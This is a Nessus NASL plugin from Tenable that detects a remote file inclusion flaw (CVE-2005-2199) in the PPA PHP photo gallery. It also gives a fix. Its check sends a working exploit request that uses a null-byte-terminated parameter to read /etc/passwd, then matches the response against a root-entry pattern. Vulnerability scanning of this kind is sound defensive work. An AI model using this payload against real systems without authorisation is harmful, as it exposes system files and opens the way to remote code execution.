#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(18672);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-2199");
  script_bugtraq_id(14209);
  script_xref(name:"OSVDB", value:"17836");

  script_name(english:"PPA functions.inc.php ppa_root_path Variable File Inclusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a remote
file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PPA, a free, PHP-based photo gallery. 

The installed version of PPA allows remote attackers to control the
'config[ppa_root_path]' variable used when including PHP code in the
'inc/functions.inc.php' script.  By leveraging this flaw, an attacker
may be able to view arbitrary files on the remote host and execute
arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://securitytracker.com/alerts/2005/Jul/1014436.html" );
 script_set_attribute(attribute:"solution", value:
"Ensure that PHP's 'magic_quotes_gpc' setting is enabled and that
'allow_url_fopen' is disabled." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for ppa_root_path variable file include vulnerability in PPA";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/inc/functions.inc.php?",
      "config[ppa_root_path]=/etc/passwd%00"
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing 
    #     remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: Failed opening '/etc/passwd.+for inclusion")
  ) {
    security_hole(port);
    exit(0);
  }
}
